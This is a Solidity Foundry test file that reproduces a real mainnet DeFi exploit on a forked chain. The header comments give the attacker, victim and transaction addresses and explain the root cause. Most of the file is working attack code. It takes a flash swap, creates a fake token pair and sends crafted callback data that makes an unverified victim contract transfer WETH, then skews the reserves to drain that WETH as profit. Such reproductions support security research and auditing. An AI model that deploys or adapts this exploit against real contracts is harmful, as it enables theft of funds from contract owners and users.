// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : $1,006.89
// Attacker : 0x87c6D33808F10348Cd9a4Cd825f25BE341d7bA2d
// Attack Contract : 0x46bBB647B61560432b58eCBa6Bd048D691701D82
// Vulnerable Contract : 0x6883Fe4D2EE50941b80b41b8F7F9BF2561D844Cc
// Attack Tx : https://etherscan.io/tx/0x6fb78c7737463ea39a23159dd8496c178106b4ee657f2fb6fcb628240c39cd2e
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x6883Fe4D2EE50941b80b41b8F7F9BF2561D844Cc#code
//
// @Analysis
// Telegram Alert : https://t.me/defimon_alerts/1544
//
// Attack summary: The attacker used a real DAI/WETH flash swap, created a temporary token/pair, and made that fake
// pair call the victim's UniswapV2 callback.
// Root cause: The unverified victim accepted a callback from a freshly-created fake pair and transferred WETH to it;
// manipulated fake-pair reserves let the attacker withdraw WETH and keep the surplus after repaying the real flash swap.

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function sync() external;
}

contract ContractTest is BaseTestWithBalanceLog {
    address private constant ATTACKER = 0x87c6D33808F10348Cd9a4Cd825f25BE341d7bA2d;
    address private constant VICTIM = 0x6883Fe4D2EE50941b80b41b8F7F9BF2561D844Cc;
    address private constant TEMP_TOKEN = 0x67F6965C0B899d12122d116d890A034e05881562;
    address private constant TEMP_HELPER = 0x25bCC6F744D2b23CE39D8189E151dE4aA621Bb6c;
    uint256 private constant FORK_BLOCK = 23_002_633;
    uint256 private constant PROFIT_WETH = 267_592_060_870_468_589;

    IERC20Like private constant WETH = IERC20Like(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);

        fundingToken = address(WETH);
        attacker = ATTACKER;

        vm.label(ATTACKER, "attacker");
        vm.label(VICTIM, "unverified callback target");
        vm.label(TEMP_TOKEN, "temporary token");
        vm.label(TEMP_HELPER, "temporary helper");
        vm.label(address(WETH), "WETH");
    }

    function testExploit() public balanceLog {
        FakeERC20 implementation = new FakeERC20();
        vm.etch(TEMP_TOKEN, address(implementation).code);
        NoopSwapHelper helperImplementation = new NoopSwapHelper();
        vm.etch(TEMP_HELPER, address(helperImplementation).code);

        FakeCallbackExploit exploit = new FakeCallbackExploit(ATTACKER);
        FakeERC20(TEMP_TOKEN).mint(address(exploit), 1_000_000_000 ether);

        uint256 beforeBalance = WETH.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        exploit.execute();

        assertEq(WETH.balanceOf(ATTACKER) - beforeBalance, PROFIT_WETH, "WETH profit mismatch");
    }
}

contract FakeCallbackExploit {
    address private constant VICTIM = 0x6883Fe4D2EE50941b80b41b8F7F9BF2561D844Cc;
    address private constant TEMP_TOKEN = 0x67F6965C0B899d12122d116d890A034e05881562;
    address private constant TEMP_HELPER = 0x25bCC6F744D2b23CE39D8189E151dE4aA621Bb6c;
    address private constant TEMP_PAIR = 0x986a80dE5B3066350Eb921d9D99a9efCa205c2d9;
    address private constant DAI_WETH_PAIR = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
    address private constant UNISWAP_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 private constant FLASH_WETH = 100_000_000_000_000_000;
    uint256 private constant VICTIM_WETH_PAYMENT = 269_000_000_000_000_000;
    uint256 private constant TEMP_PAIR_WETH_OUT = 367_892_963_578_592_963;
    uint256 private constant FLASH_REPAY = 100_300_902_708_124_374;
    uint256 private constant PROFIT_WETH = 267_592_060_870_468_589;
    uint256 private constant ROUTE_AMOUNT_HINT = 3_071_891_971_238_012_784_039;
    uint256 private constant HELPER_AMOUNT0_OUT = 2_859_728_258_123_006_471_879_656;
    uint256 private constant NESTED_PAYMENT_AMOUNT = 2 ether;
    uint256 private constant ABI_TUPLE_OFFSET = 0x20;
    uint256 private constant NESTED_TAIL_OFFSET = 0xe0;
    bytes32 private constant VICTIM_CALLBACK_DATA_HASH =
        0x7e260cef7057ac72b4717b9474cc0d186496fb819a7be14e22213de9d9e95d17;

    IERC20Like private constant WETH = IERC20Like(WETH_ADDRESS);
    IERC20Like private constant FAKE_TOKEN = IERC20Like(TEMP_TOKEN);

    address private immutable _recipient;

    struct VictimCallbackPayload {
        address token0;
        address token1;
        uint256 amount0;
        uint256 amount1;
        uint256 paymentAmount;
        address paymentTo;
        address receiver;
        VictimSwapHop[] hops;
    }

    struct VictimSwapHop {
        address helper;
        address token0;
        address token1;
        uint256 routeAmountHint;
        uint256 amount0Out;
        uint256 amount1Out;
        bytes data;
    }

    constructor(address recipient) {
        _recipient = recipient;
    }

    function execute() external {
        IUniswapV2Pair(DAI_WETH_PAIR).swap(0, FLASH_WETH, address(this), bytes("COMPLETE_RECOVERY"));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == DAI_WETH_PAIR, "unexpected pair");
        require(sender == address(this), "unexpected sender");
        require(amount0 == 0 && amount1 == FLASH_WETH, "unexpected flash amount");

        address pair = IUniswapV2Factory(UNISWAP_FACTORY).createPair(TEMP_TOKEN, WETH_ADDRESS);
        require(pair == TEMP_PAIR, "unexpected temp pair");

        FAKE_TOKEN.transfer(TEMP_PAIR, 100 ether);
        WETH.transfer(TEMP_PAIR, FLASH_WETH);
        IUniswapV2Pair(TEMP_PAIR).sync();

        bytes memory victimCallbackData = _victimCallbackData();
        require(keccak256(victimCallbackData) == VICTIM_CALLBACK_DATA_HASH, "callback data mismatch");
        IUniswapV2Pair(TEMP_PAIR).swap(1 ether, 0, VICTIM, victimCallbackData);
        require(WETH.balanceOf(TEMP_PAIR) == FLASH_WETH + VICTIM_WETH_PAYMENT, "victim payment mismatch");

        IUniswapV2Pair(TEMP_PAIR).sync();
        FAKE_TOKEN.transfer(TEMP_PAIR, 999_999_900 ether);
        IUniswapV2Pair(TEMP_PAIR).swap(0, TEMP_PAIR_WETH_OUT, address(this), "");

        WETH.transfer(DAI_WETH_PAIR, FLASH_REPAY);
        WETH.transfer(_recipient, PROFIT_WETH);
    }

    function _victimCallbackData() private pure returns (bytes memory) {
        VictimSwapHop[] memory hops = new VictimSwapHop[](1);
        hops[0] = VictimSwapHop({
            helper: TEMP_HELPER,
            token0: WETH_ADDRESS,
            token1: TEMP_TOKEN,
            routeAmountHint: ROUTE_AMOUNT_HINT,
            amount0Out: HELPER_AMOUNT0_OUT,
            amount1Out: 0,
            data: _nestedVictimCallbackData()
        });

        return abi.encode(
            VictimCallbackPayload({
                token0: WETH_ADDRESS,
                token1: TEMP_TOKEN,
                amount0: 0,
                amount1: 0,
                paymentAmount: VICTIM_WETH_PAYMENT,
                paymentTo: TEMP_PAIR,
                receiver: VICTIM,
                hops: hops
            })
        );
    }

    function _nestedVictimCallbackData() private pure returns (bytes memory) {
        return abi.encode(
            ABI_TUPLE_OFFSET,
            WETH_ADDRESS,
            TEMP_TOKEN,
            uint256(0),
            uint256(0),
            NESTED_PAYMENT_AMOUNT,
            TEMP_PAIR,
            VICTIM,
            NESTED_TAIL_OFFSET
        );
    }
}

contract FakeERC20 {
    mapping(address => uint256) public balanceOf;

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function symbol() external pure returns (string memory) {
        return "TMP";
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract NoopSwapHelper {
    function swap(uint256, uint256, address, bytes calldata) external {}
}
